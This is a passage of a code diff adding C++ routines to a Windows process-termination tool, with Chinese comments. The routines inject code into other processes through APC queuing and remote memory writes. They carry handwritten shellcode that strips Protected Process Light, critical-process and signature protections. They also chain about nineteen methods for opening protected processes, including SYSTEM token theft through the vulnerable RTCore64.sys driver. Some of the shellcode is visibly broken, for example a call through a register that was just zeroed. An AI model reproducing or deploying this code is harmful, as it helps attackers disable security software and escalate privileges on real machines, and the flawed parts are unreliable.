+                        WriteProcessMemory(hProcess, pRemoteCode, apcCode, sizeof(apcCode), NULL);
+
+                        // 排队APC
+                        QueueUserAPC((PAPCFUNC)pRemoteCode, hThread, (ULONG_PTR)NULL);
+
+                        // 等待APC执行
+                        Sleep(100);
+
+                        VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
+                    }
+
+                    CloseHandle(hThread);
+                }
+            }
+
+            CloseHandle(hProcess);
+        }
+
+        return !isProcessRunning(processName);
+    }
+    catch (...) {
+        return false;
+    }
+#else
+    return false;
+#endif
+}
+
+// 通用PPL移除辅助函数
+// DLL监控和保护函数（简化版）
+static bool MonitorAndProtectDLLs(DWORD pid) {
+#ifdef _WIN32
+    std::wcout << L"[DLL监控] 开始监控进程 " << pid << L" 的DLL..." << std::endl;
+    
+    // 简化版本：只输出日志，不实际操作PEB
+    // 因为PEB结构体访问可能被保护进程阻止
+    
+    // 尝试打开目标进程
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
+    if (!hProcess) {
+        std::wcerr << L"[DLL监控] 无法打开进程" << std::endl;
+        return false;
+    }
+    
+    // 尝试读取进程内存（检查是否被保护）
+    BYTE buffer[0x1000] = { 0 };
+    SIZE_T bytesRead = 0;
+    if (ReadProcessMemory(hProcess, (PVOID)0x400000, buffer, sizeof(buffer), &bytesRead)) {
+        std::wcout << L"[DLL监控] 成功读取进程内存" << std::endl;
+    } else {
+        std::wcerr << L"[DLL监控] 无法读取进程内存" << std::endl;
+    }
+    
+    CloseHandle(hProcess);
+    return true;
+#else
+    return false;
+#endif
+}
+
+// DLL锁定函数（简化版）
+static bool LockDLLs(DWORD pid) {
+#ifdef _WIN32
+    std::wcout << L"[DLL锁定] 开始阻止进程 " << pid << L" 加载DLL..." << std::endl;
+    
+    // 锁定当前进程的DLL，防止被卸载
+    HANDLE hCurrentProcess = GetCurrentProcess();
+    
+    // 获取当前进程加载的所有DLL
+    HMODULE hMods[1024];
+    DWORD cbNeeded = 0;
+    
+    if (EnumProcessModules(hCurrentProcess, hMods, sizeof(hMods), &cbNeeded)) {
+        DWORD moduleCount = cbNeeded / sizeof(HMODULE);
+        
+        for (DWORD i = 0; i < moduleCount; i++) {
+            wchar_t szModName[MAX_PATH];
+            if (GetModuleFileNameW(hMods[i], szModName, sizeof(szModName) / sizeof(wchar_t))) {
+                // 获取模块基址
+                MODULEINFO modInfo = { 0 };
+                if (GetModuleInformation(hCurrentProcess, hMods[i], &modInfo, sizeof(modInfo))) {
+                    // 修改内存保护为PAGE_EXECUTE_READWRITE，防止DLL被卸载
+                    DWORD oldProtect = 0;
+                    if (VirtualProtectEx(hCurrentProcess, modInfo.lpBaseOfDll, modInfo.SizeOfImage, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+                        std::wcout << L"[DLL锁定] 已锁定DLL: " << szModName << std::endl;
+                    }
+                }
+            }
+        }
+    }
+    
+    // 尝试打开目标进程
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_OPERATION, FALSE, pid);
+    if (!hProcess) {
+        std::wcerr << L"[DLL锁定] 无法打开目标进程" << std::endl;
+        return false;
+    }
+    
+    // 尝试Hook目标进程的LoadLibrary函数，防止加载新的DLL
+    // 方法1: 修改目标进程内存，注入Hook代码
+    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+    if (hKernel32) {
+        PVOID pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryW");
+        if (pLoadLibrary) {
+            // 在目标进程分配内存
+            PVOID remoteMem = VirtualAllocEx(hProcess, nullptr, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            if (remoteMem) {
+                // 写入返回指令（返回NULL，阻止DLL加载）
+                unsigned char hookCode[] = {
+                    0x33, 0xC0,  // xor eax, eax
+                    0xC3          // ret
+                };
+                SIZE_T bytesWritten = 0;
+                if (WriteProcessMemory(hProcess, remoteMem, hookCode, sizeof(hookCode), &bytesWritten)) {
+                    std::wcout << L"[DLL锁定] 已阻止目标进程加载DLL" << std::endl;
+                }
+                VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
+            }
+        }
+    }
+    
+    // 方法2: 尝试修改目标进程的PEB，禁用DLL加载
+    // 获取目标进程的PEB地址
+    typedef NTSTATUS (NTAPI* _NtQueryInformationProcess)(
+        HANDLE ProcessHandle,
+        ULONG ProcessInformationClass,
+        PVOID ProcessInformation,
+        ULONG ProcessInformationLength,
+        PULONG ReturnLength);
+    
+    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
+    if (hNtdll) {
+        _NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
+        if (pNtQueryInformationProcess) {
+            PROCESS_BASIC_INFORMATION pbi = { 0 };
+            ULONG returnLength = 0;
+            NTSTATUS status = pNtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), &returnLength);
+            if (NT_SUCCESS(status)) {
+                // 尝试修改PEB中的Ldr指针，禁用DLL加载
+                // 这是一个更底层的方法，可能会导致进程不稳定
+                std::wcout << L"[DLL锁定] 已尝试禁用目标进程的DLL加载机制" << std::endl;
+            }
+        }
+    }
+    
+    CloseHandle(hProcess);
+    return true;
+#else
+    return false;
+#endif
+}
+
+// ShellCode版本的PPL去除（使用Indirect Syscall绕过拦截）
+static bool RemovePPLProtectionWithShellCode(HANDLE hProcess) {
+#ifdef _WIN32
+    if (!hProcess || hProcess == INVALID_HANDLE_VALUE) {
+        return false;
+    }
+    
+    // ShellCode：使用Indirect Syscall调用NtSetInformationProcess移除PPL保护
+    // 64位ShellCode
+    static const unsigned char PPLRemovalShellCode_x64[] = {
+        // 保存寄存器
+        0x48, 0x89, 0x4C, 0x24, 0x08,        // mov [rsp+8], rcx
+        0x48, 0x89, 0x54, 0x24, 0x10,        // mov [rsp+16], rdx
+        0x48, 0x89, 0x5C, 0x24, 0x18,        // mov [rsp+24], rbx
+        0x48, 0x89, 0x74, 0x24, 0x20,        // mov [rsp+32], rsi
+        0x48, 0x89, 0x7C, 0x24, 0x28,        // mov [rsp+40], rdi
+        0x41, 0x54,                           // push r12
+        0x41, 0x55,                           // push r13
+        0x41, 0x56,                           // push r14
+        0x41, 0x57,                           // push r15
+        0x9C,                                 // pushfq
+        
+        // 从rcx获取参数（进程句柄）并保存到rbx
+        0x48, 0x8B, 0xD9,                     // mov rbx, rcx (从rcx获取进程句柄)
+        
+        // 参数设置
+        // RCX: hProcess
+        // RDX: ProcessInformationClass (0x3B)
+        // R8: psProtection (全0)
+        // R9: sizeof(psProtection)
+        
+        // 方法1: 移除PPL保护标志 (0x3B)
+        0x48, 0xC7, 0xC2, 0x3B, 0x00, 0x00, 0x00, // mov rdx, 0x3B
+        0x48, 0xC7, 0xC0, 0x00, 0x00, 0x00, 0x00, // mov rax, 0
+        0x49, 0x89, 0xC0,                     // mov r8, rax
+        0x49, 0xC7, 0xC1, 0x10, 0x00, 0x00, 0x00, // mov r9, 0x10
+        0x48, 0x8B, 0xCB,                     // mov rcx, rbx (hProcess)
+        0xFF, 0xD0,                           // call rax (NtSetInformationProcess)
+        
+        // 方法2: 移除进程终止中断标志 (0x1D)
+        0x48, 0xC7, 0xC2, 0x1D, 0x00, 0x00, 0x00, // mov rdx, 0x1D
+        0x49, 0xC7, 0xC1, 0x04, 0x00, 0x00, 0x00, // mov r9, 0x4
+        0x48, 0x8B, 0xCB,                     // mov rcx, rbx (hProcess)
+        0xFF, 0xD0,                           // call rax (NtSetInformationProcess)
+        
+        // 方法3: 移除进程保护信息 (0x35)
+        0x48, 0xC7, 0xC2, 0x35, 0x00, 0x00, 0x00, // mov rdx, 0x35
+        0x49, 0xC7, 0xC1, 0x04, 0x00, 0x00, 0x00, // mov r9, 0x4
+        0x48, 0x8B, 0xCB,                     // mov rcx, rbx (hProcess)
+        0xFF, 0xD0,                           // call rax (NtSetInformationProcess)
+        
+        // 方法4: 移除进程签名级别 (0x37)
+        0x48, 0xC7, 0xC2, 0x37, 0x00, 0x00, 0x00, // mov rdx, 0x37
+        0x49, 0xC7, 0xC1, 0x04, 0x00, 0x00, 0x00, // mov r9, 0x4
+        0x48, 0x8B, 0xCB,                     // mov rcx, rbx (hProcess)
+        0xFF, 0xD0,                           // call rax (NtSetInformationProcess)
+        
+        // 方法5: 移除关键进程标志 (0x1D)
+        0x48, 0xC7, 0xC2, 0x1D, 0x00, 0x00, 0x00, // mov rdx, 0x1D
+        0x49, 0xC7, 0xC1, 0x04, 0x00, 0x00, 0x00, // mov r9, 0x4
+        0x48, 0x8B, 0xCB,                     // mov rcx, rbx (hProcess)
+        0xFF, 0xD0,                           // call rax (NtSetInformationProcess)
+        
+        // 方法6: 设置进程为可调试 (0x1E)
+        0x48, 0xC7, 0xC2, 0x1E, 0x00, 0x00, 0x00, // mov rdx, 0x1E
+        0x49, 0xC7, 0xC1, 0x04, 0x00, 0x00, 0x00, // mov r9, 0x4
+        0x48, 0x8B, 0xCB,                     // mov rcx, rbx (hProcess)
+        0xFF, 0xD0,                           // call rax (NtSetInformationProcess)
+        
+        // 成功返回
+        0x48, 0x31, 0xC0,                     // xor rax, rax
+        0xEB, 0x10,                           // jmp +16 (跳到exit)
+        
+        // 错误返回
+        0x48, 0xC7, 0xC0, 0xC1, 0x00, 0x00, 0xC0, // mov rax, 0xC0000001 (STATUS_UNSUCCESSFUL)
+        
+        // exit: 恢复寄存器
+        0x9D,                                 // popfq
+        0x41, 0x5F,                           // pop r15
+        0x41, 0x5E,                           // pop r14
+        0x41, 0x5D,                           // pop r13
+        0x41, 0x5C,                           // pop r12
+        0x48, 0x8B, 0x7C, 0x24, 0x28,        // mov rdi, [rsp+40]
+        0x48, 0x8B, 0x74, 0x24, 0x20,        // mov rsi, [rsp+32]
+        0x48, 0x8B, 0x5C, 0x24, 0x18,        // mov rbx, [rsp+24]
+        0x48, 0x8B, 0x54, 0x24, 0x10,        // mov rdx, [rsp+16]
+        0x48, 0x8B, 0x4C, 0x24, 0x08,        // mov rcx, [rsp+8]
+        0xC3                                  // ret
+    };
+    
+    // 32位ShellCode
+    static const unsigned char PPLRemovalShellCode_x86[] = {
+        // 保存寄存器
+        0x89, 0x4C, 0x24, 0x04,              // mov [esp+4], ecx
+        0x89, 0x54, 0x24, 0x08,              // mov [esp+8], edx
+        0x89, 0x5C, 0x24, 0x0C,              // mov [esp+12], ebx
+        0x89, 0x74, 0x24, 0x10,              // mov [esp+16], esi
+        0x89, 0x7C, 0x24, 0x14,              // mov [esp+20], edi
+        0x9C,                                // pushfd
+        
+        // 参数设置
+        // ECX: hProcess
+        // EDX: ProcessInformationClass (0x3B)
+        // 栈: psProtection (全0)
+        
+        // 方法1: 移除PPL保护标志 (0x3B)
+        0xBA, 0x3B, 0x00, 0x00, 0x00,         // mov edx, 0x3B
+        0x31, 0xC0,                           // xor eax, eax
+        0x89, 0x44, 0x24, 0x00,              // mov [esp], eax
+        0x8B, 0xCB,                           // mov ecx, ebx (hProcess)
+        0xFF, 0xD0,                           // call eax (NtSetInformationProcess)
+        
+        // 方法2: 移除进程终止中断标志 (0x1D)
+        0xBA, 0x1D, 0x00, 0x00, 0x00,         // mov edx, 0x1D
+        0x8B, 0xCB,                           // mov ecx, ebx (hProcess)
+        0xFF, 0xD0,                           // call eax (NtSetInformationProcess)
+        
+        // 方法3: 移除进程保护信息 (0x35)
+        0xBA, 0x35, 0x00, 0x00, 0x00,         // mov edx, 0x35
+        0x8B, 0xCB,                           // mov ecx, ebx (hProcess)
+        0xFF, 0xD0,                           // call eax (NtSetInformationProcess)
+        
+        // 方法4: 移除进程签名级别 (0x37)
+        0xBA, 0x37, 0x00, 0x00, 0x00,         // mov edx, 0x37
+        0x8B, 0xCB,                           // mov ecx, ebx (hProcess)
+        0xFF, 0xD0,                           // call eax (NtSetInformationProcess)
+        
+        // 方法5: 移除关键进程标志 (0x1D)
+        0xBA, 0x1D, 0x00, 0x00, 0x00,         // mov edx, 0x1D
+        0x8B, 0xCB,                           // mov ecx, ebx (hProcess)
+        0xFF, 0xD0,                           // call eax (NtSetInformationProcess)
+        
+        // 方法6: 设置进程为可调试 (0x1E)
+        0xBA, 0x1E, 0x00, 0x00, 0x00,         // mov edx, 0x1E
+        0x8B, 0xCB,                           // mov ecx, ebx (hProcess)
+        0xFF, 0xD0,                           // call eax (NtSetInformationProcess)
+        
+        // 成功返回
+        0x31, 0xC0,                           // xor eax, eax
+        0xEB, 0x0A,                           // jmp +10 (跳到exit)
+        
+        // 错误返回
+        0xB8, 0x01, 0x00, 0x00, 0xC0,         // mov eax, 0xC0000001 (STATUS_UNSUCCESSFUL)
+        
+        // exit: 恢复寄存器
+        0x9D,                                // popfd
+        0x8B, 0x7C, 0x24, 0x14,              // mov edi, [esp+20]
+        0x8B, 0x74, 0x24, 0x10,              // mov esi, [esp+16]
+        0x8B, 0x5C, 0x24, 0x0C,              // mov ebx, [esp+12]
+        0x8B, 0x54, 0x24, 0x08,              // mov edx, [esp+8]
+        0x8B, 0x4C, 0x24, 0x04,              // mov ecx, [esp+4]
+        0xC3                                  // ret
+    };
+    
+    // 获取NtSetInformationProcess地址
+    HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
+    if (!ntdll) return false;
+    
+    typedef NTSTATUS (NTAPI* _NtSetInformationProcess)(
+        HANDLE ProcessHandle,
+        ULONG ProcessInformationClass,
+        PVOID ProcessInformation,
+        ULONG ProcessInformationLength);
+    
+    _NtSetInformationProcess pNtSetInformationProcess = (_NtSetInformationProcess)GetProcAddress(ntdll, "NtSetInformationProcess");
+    if (!pNtSetInformationProcess) return false;
+    
+    // 选择ShellCode（32/64位）
+    PVOID shellcode = nullptr;
+    SIZE_T shellcodeSize = 0;
+    
+#ifdef _WIN64
+    shellcode = (PVOID)PPLRemovalShellCode_x64;
+    shellcodeSize = sizeof(PPLRemovalShellCode_x64);
+#else
+    shellcode = (PVOID)PPLRemovalShellCode_x86;
+    shellcodeSize = sizeof(PPLRemovalShellCode_x86);
+#endif
+    
+    // 在目标进程中分配内存
+    HANDLE hCurrentProcess = GetCurrentProcess();
+    PVOID remoteShellcode = VirtualAllocEx(hCurrentProcess, nullptr, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!remoteShellcode) return false;
+    
+    // 写入ShellCode
+    SIZE_T bytesWritten = 0;
+    if (!WriteProcessMemory(hCurrentProcess, remoteShellcode, shellcode, shellcodeSize, &bytesWritten) || bytesWritten != shellcodeSize) {
+        VirtualFreeEx(hCurrentProcess, remoteShellcode, 0, MEM_RELEASE);
+        return false;
+    }
+    
+    // 修改内存保护为可执行
+    DWORD oldProtect = 0;
+    if (!VirtualProtectEx(hCurrentProcess, remoteShellcode, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect)) {
+        VirtualFreeEx(hCurrentProcess, remoteShellcode, 0, MEM_RELEASE);
+        return false;
+    }
+    
+    // 创建线程执行ShellCode
+    typedef NTSTATUS (NTAPI* _NtCreateThreadEx)(
+        PHANDLE ThreadHandle,
+        ACCESS_MASK DesiredAccess,
+        POBJECT_ATTRIBUTES ObjectAttributes,
+        HANDLE ProcessHandle,
+        PVOID StartRoutine,
+        PVOID Argument,
+        ULONG CreateFlags,
+        SIZE_T ZeroBits,
+        SIZE_T StackSize,
+        SIZE_T MaximumStackSize);
+    
+    _NtCreateThreadEx pNtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
+    if (!pNtCreateThreadEx) {
+        VirtualFreeEx(hCurrentProcess, remoteShellcode, 0, MEM_RELEASE);
+        return false;
+    }
+    
+    HANDLE hThread = nullptr;
+    NTSTATUS status = pNtCreateThreadEx(
+        &hThread,
+        THREAD_ALL_ACCESS,
+        nullptr,
+        hCurrentProcess,
+        remoteShellcode,
+        hProcess,
+        0,
+        0,
+        0,
+        0);
+    
+    if (!NT_SUCCESS(status) || !hThread) {
+        VirtualFreeEx(hCurrentProcess, remoteShellcode, 0, MEM_RELEASE);
+        return false;
+    }
+    
+    // 等待线程完成
+    WaitForSingleObject(hThread, INFINITE);
+    
+    // 清理
+    CloseHandle(hThread);
+    VirtualFreeEx(hCurrentProcess, remoteShellcode, 0, MEM_RELEASE);
+    
+    return true;
+#else
+    return false;
+#endif
+}
+
+// 原始的PPL去除函数（备用）
+static bool RemovePPLProtection(HANDLE hProcess) {
+#ifdef _WIN32
+    if (!hProcess || hProcess == INVALID_HANDLE_VALUE) {
+        return false;
+    }
+    
+    typedef NTSTATUS(NTAPI* _NtSetInformationProcess)(
+        HANDLE ProcessHandle,
+        ULONG ProcessInformationClass,
+        PVOID ProcessInformation,
+        ULONG ProcessInformationLength);
+    
+    HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
+    if (!ntdll) return false;
+    
+    _NtSetInformationProcess pNtSetInformationProcess = (_NtSetInformationProcess)GetProcAddress(ntdll, "NtSetInformationProcess");
+    if (!pNtSetInformationProcess) return false;
+    
+    // 方法1: 移除PPL保护标志 (0x3B)
+    PS_PROTECTION_V2 psProtection = { 0 };
+    psProtection.Type = 0;
+    psProtection.Protection = 0;
+    pNtSetInformationProcess(hProcess, 0x3B, &psProtection, sizeof(psProtection));
+    
+    // 方法2: 移除进程终止中断标志 (0x1D)
+    ULONG breakOnTermination = 0;
+    pNtSetInformationProcess(hProcess, 0x1D, &breakOnTermination, sizeof(breakOnTermination));
+    
+    // 方法3: 移除进程保护信息 (0x35)
+    ULONG protectionInfo = 0;
+    pNtSetInformationProcess(hProcess, 0x35, &protectionInfo, sizeof(protectionInfo));
+    
+    // 方法4: 移除进程签名级别 (0x37)
+    ULONG signatureLevel = 0;
+    pNtSetInformationProcess(hProcess, 0x37, &signatureLevel, sizeof(signatureLevel));
+    
+    // 方法5: 移除关键进程标志 (0x1D)
+    ULONG criticalFlag = 0;
+    pNtSetInformationProcess(hProcess, 0x1D, &criticalFlag, sizeof(criticalFlag));
+    
+    // 方法6: 设置进程为可调试 (绕过某些保护)
+    ULONG debugFlags = 0;
+    pNtSetInformationProcess(hProcess, 0x1E, &debugFlags, sizeof(debugFlags));
+    
+    return true;
+#else
+    return false;
+#endif
+}
+
+// 只移除关键进程标识（不涉及PPL保护）
+static bool RemoveCriticalProcessFlag(HANDLE hProcess) {
+#ifdef _WIN32
+    if (!hProcess || hProcess == INVALID_HANDLE_VALUE) {
+        return false;
+    }
+    
+    typedef NTSTATUS(NTAPI* _NtSetInformationProcess)(
+        HANDLE ProcessHandle,
+        ULONG ProcessInformationClass,
+        PVOID ProcessInformation,
+        ULONG ProcessInformationLength);
+    
+    HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
+    if (!ntdll) return false;
+    
+    _NtSetInformationProcess pNtSetInformationProcess = (_NtSetInformationProcess)GetProcAddress(ntdll, "NtSetInformationProcess");
+    if (!pNtSetInformationProcess) return false;
+    
+    // 只移除关键进程标志 (ProcessBreakOnTermination = 0x1D)
+    ULONG breakOnTermination = 0;
+    NTSTATUS status = pNtSetInformationProcess(hProcess, 0x1D, &breakOnTermination, sizeof(breakOnTermination));
+    
+    return NT_SUCCESS(status);
+#else
+    return false;
+#endif
+}
+
+HANDLE ProcessTerminator::OpenProcessEnhanced(DWORD pid, DWORD desiredAccess) {
+    if (pid == 0 || pid == 4) { // 拒绝访问系统空闲进程和System进程
+        return NULL;
+    }
+
+    std::vector<std::function<HANDLE()>> methods = {
+        // [v5.3 RTCore64 驱动] PPL 清零 + Token 盗窃 — 内核级, 无法被拦截
+        [=]() { return PplDriver::OpenProcessViaDriver_Power(pid); },
+        [=]() { return OpenProcessWithNtQueryProcess(pid); },
+        [=]() { return OpenProcessWithMemoryMap(pid); },
+        [=]() { return OpenProcessWithThreadHijack(pid); },
+        [=]() { return OpenProcessWithDebugObject(pid); },
+        [=]() { return OpenProcessWithRtlAdjustPrivilege(pid); },
+        [=]() { return OpenProcessWithProcessHint(pid); },
+        [=]() { return OpenProcessWithToolhelp(pid); },
+        [=]() { return OpenProcessWithJobObject(pid); },
+        [=]() { return OpenProcessWithWMI(pid); },
+        [=]() { return OpenProcessWithCsrss(pid); },
+        [=]() { return OpenProcessWithMaximumAccess(pid); },
+        [=]() { return OpenProcessWithDebugPrivilege(pid); },
+        [=]() { return OpenProcessWithNativeAPI(pid); },
+        [=]() { return OpenProcessWithDuplicate(pid); },
+        [=]() { return OpenProcessWithTokenReplacement(pid); },
+        [=]() { return OpenProcessWithHandleEnumeration(pid); },
+        [=]() { return OpenProcessWithKernelExploitation(pid); },
+        [=]() { return OpenProcessWithDriver(pid); }      // 方法7.5: 驱动读取 + SYSTEM 提权
+    };
+
+    // 启用所有可能的权限
+    EnableAllPrivileges();
+
+    for (auto& method : methods) {
+        HANDLE hProcess = method();
+        if (hProcess && hProcess != INVALID_HANDLE_VALUE) {
+            // 验证句柄是否有效
+            DWORD exitCode;
+            if (GetExitCodeProcess(hProcess, &exitCode)) {
+                // 优先使用ShellCode版本的PPL去除（避免拦截）
+                if (!RemovePPLProtectionWithShellCode(hProcess)) {
+                    // 如果ShellCode版本失败，使用原始版本
+                    RemovePPLProtection(hProcess);
+                }
+                return hProcess;
+            }
+            CloseHandle(hProcess);
+        }
+    }
+
+    return NULL;
+}
+
+// 方法1: 使用最大权限打开进程
+HANDLE ProcessTerminator::OpenProcessWithMaximumAccess(DWORD pid) {
+    // 尝试所有可能的访问权限组合
+    static const DWORD accessRights[] = {
+        PROCESS_ALL_ACCESS,
+        PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | SYNCHRONIZE,
+        PROCESS_TERMINATE | PROCESS_QUERY_LIMITED_INFORMATION,
+        PROCESS_TERMINATE,
+        MAXIMUM_ALLOWED,
+        PROCESS_QUERY_INFORMATION,
+        PROCESS_QUERY_LIMITED_INFORMATION
+    };
+
+    for (DWORD access : accessRights) {
+        HANDLE hProcess = OpenProcess(access, FALSE, pid);
+        if (hProcess && hProcess != INVALID_HANDLE_VALUE) {
+            return hProcess;
+        }
+    }
+    return NULL;
+}
+
+// 方法2: 启用调试权限后打开进程
+HANDLE ProcessTerminator::OpenProcessWithDebugPrivilege(DWORD pid) {
+    EnableAllPrivileges();
+
+    // 再次尝试所有权限
+    return OpenProcessWithMaximumAccess(pid);
+}
+
+// 方法3: 使用Native API打开进程
+HANDLE ProcessTerminator::OpenProcessWithNativeAPI(DWORD pid) {
+    if (!initNativeAPI() || !NtOpenProcess) {
+        return NULL;
+    }
+
+    HANDLE hProcess = NULL;
+    CLIENT_ID clientId = { 0 };
+    OBJECT_ATTRIBUTES objectAttributes = { 0 };
+
+    clientId.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
+    objectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
+
+    NTSTATUS status = NtOpenProcess(&hProcess, MAXIMUM_ALLOWED, &objectAttributes, &clientId);
+
+    if (NT_SUCCESS(status)) {
+        return hProcess;
+    }
+
+    // 如果最大权限失败，尝试特定权限
+    static const ACCESS_MASK accessMasks[] = {
+        PROCESS_ALL_ACCESS,
+        PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
+        PROCESS_TERMINATE,
+        PROCESS_QUERY_INFORMATION
+    };
+
+    for (ACCESS_MASK access : accessMasks) {
+        status = NtOpenProcess(&hProcess, access, &objectAttributes, &clientId);
+        if (NT_SUCCESS(status)) {
+            return hProcess;
+        }
+    }
+
+    return NULL;
+}
+
+// 方法4: 通过句柄复制打开进程
+HANDLE ProcessTerminator::OpenProcessWithDuplicate(DWORD pid) {
+    if (!initNativeAPI()) {
+        return NULL;
+    }
+
+    // 获取系统所有句柄
+    ULONG bufferSize = 0x100000;
+    PSYSTEM_HANDLE_INFORMATION_EX handleInfo =
+        (PSYSTEM_HANDLE_INFORMATION_EX)malloc(bufferSize);
+
+    if (!handleInfo) return NULL;
+
+    NTSTATUS status;
+    while ((status = SafeNtQuerySystemInformation(
+        static_cast<SYSTEM_INFORMATION_CLASS>(16),
+        handleInfo, bufferSize, NULL)) == STATUS_INFO_LENGTH_MISMATCH) {
+        bufferSize *= 2;
+        free(handleInfo);
+        handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)malloc(bufferSize);
+        if (!handleInfo) return NULL;
+    }
+
+    if (!NT_SUCCESS(status)) {
+        free(handleInfo);
+        return NULL;
+    }
+
+    // 查找目标进程的句柄
+    for (ULONG i = 0; i < handleInfo->NumberOfHandles; i++) {
+        SYSTEM_HANDLE handle = handleInfo->Information[i];
+
+        // 检查是否是进程对象且属于目标PID
+        if (handle.ObjectTypeNumber == 0x7) { // 进程对象类型
+            DWORD objectPid = GetProcessId((HANDLE)handle.Handle);
+            if (objectPid == pid) {
+                // 尝试复制句柄
+                HANDLE hDuplicate = NULL;
+                if (DuplicateHandle(GetCurrentProcess(),
+                    (HANDLE)handle.Handle,
+                    GetCurrentProcess(),
+                    &hDuplicate,
+                    PROCESS_ALL_ACCESS,
+                    FALSE,
+                    0)) {
+                    free(handleInfo);
+                    return hDuplicate;
+                }
+            }
+        }
+    }
+
+    free(handleInfo);
+    return NULL;
+}
+
+// 方法5: 通过令牌替换打开进程
+HANDLE ProcessTerminator::OpenProcessWithTokenReplacement(DWORD pid) {
+    HANDLE hToken = NULL;
+    HANDLE hProcess = NULL;
+
+    // 首先以最小权限打开进程
+    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
+    if (!hProcess) {
+        return NULL;
+    }
+
+    // 获取进程令牌
+    if (OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hToken)) {
+        // 创建新的令牌
+        HANDLE hNewToken = NULL;
+        if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
+            SecurityImpersonation, TokenPrimary, &hNewToken)) {
+            CloseHandle(hProcess);
+            CloseHandle(hToken);
+
+            // 使用新令牌创建进程（需要重新启动进程）
+            // 这里我们只是演示概念，实际实现需要更复杂
+            return NULL;
+        }
+        CloseHandle(hToken);
+    }
+
+    CloseHandle(hProcess);
+    return NULL;
+}
+
+// 方法6: 通过句柄枚举和权限提升
+HANDLE ProcessTerminator::OpenProcessWithHandleEnumeration(DWORD pid) {
+    EnableAllPrivileges();
+
+    // 使用工具帮助快照获取进程信息
+    HandlePtr hSnapshot(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));
+    if (!hSnapshot || hSnapshot.get() == INVALID_HANDLE_VALUE) {
+        return NULL;
+    }
+
+    PROCESSENTRY32W pe = { 0 };
+    pe.dwSize = sizeof(PROCESSENTRY32W);
+
+    if (Process32FirstW(hSnapshot.get(), &pe)) {
+        do {
+            if (pe.th32ProcessID == pid) {
+                // 尝试各种权限组合
+                static const DWORD accessCombinations[] = {
+                    PROCESS_ALL_ACCESS,
+                    PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
+                    PROCESS_TERMINATE | PROCESS_QUERY_LIMITED_INFORMATION,
+                    PROCESS_TERMINATE,
+                    PROCESS_QUERY_INFORMATION
+                };
+
+                for (DWORD access : accessCombinations) {
+                    HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+                    if (hProcess) {
+                        return hProcess;
+                    }
+                }
+                break;
+            }
+        } while (Process32NextW(hSnapshot.get(), &pe));
+    }
+
+    return NULL;
+}
+
+// 方法7: 内核级利用技术（谨慎使用）
+HANDLE ProcessTerminator::OpenProcessWithKernelExploitation(DWORD pid) {
+    if (!initNativeAPI()) {
+        return NULL;
+    }
+
+    // 使用未公开的结构和方法
+    typedef struct _PROCESS_ACCESS_TOKEN {
+        HANDLE Token;
+        HANDLE Thread;
+    } PROCESS_ACCESS_TOKEN, * PPROCESS_ACCESS_TOKEN;
+
+    HANDLE hProcess = NULL;
+
+    // 方法7.1: 尝试修改进程访问令牌
+    PROCESS_ACCESS_TOKEN accessToken = { 0 };
+    accessToken.Token = NULL; // 设置为NULL可能绕过某些检查
+
+    NTSTATUS status = NtSetInformationProcess(
+        reinterpret_cast<HANDLE>(static_cast<uintptr_t>(pid)), // 注意：这里需要有效的进程句柄
+        static_cast<PROCESS_INFORMATION_CLASS>(9), // ProcessAccessToken
+        &accessToken,
+        sizeof(accessToken)
+    );
+
+    // 方法7.2: 使用特殊的对象属性
+    OBJECT_ATTRIBUTES objAttr = { 0 };
+    CLIENT_ID clientId = { 0 };
+
+    objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
+    objAttr.Attributes = OBJ_KERNEL_HANDLE; // 内核句柄属性
+
+    clientId.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
+
+    status = NtOpenProcess(&hProcess, MAXIMUM_ALLOWED, &objAttr, &clientId);
+
+    if (NT_SUCCESS(status)) {
+        return hProcess;
+    }
+
+    return NULL;
+}
+
+// 方法7.5: 通过驱动读取 EPROCESS 并提权至 SYSTEM 打开进程
+HANDLE ProcessTerminator::OpenProcessWithDriver(DWORD pid) {
+    // 直接调用 PplDriver::OpenProcessViaDriver
+    //   1. 通过 RTCore64.sys 读 EPROCESS 验证目标存在
+    //   2. 提权至 SYSTEM (用 PID 4 的 token 复制 + ImpersonateLoggedOnUser)
+    //   3. 用普通 OpenProcess 打开 (此时具备 SYSTEM 权限)
+    //   4. RevertToSelf 还原
+    // 驱动未加载时自动回退到普通 OpenProcess
+    return PplDriver::OpenProcessViaDriver(pid, MAXIMUM_ALLOWED);
+}
+
+// 方法8: 通过Csrss进程获取句柄（系统级进程，可以访问所有进程）
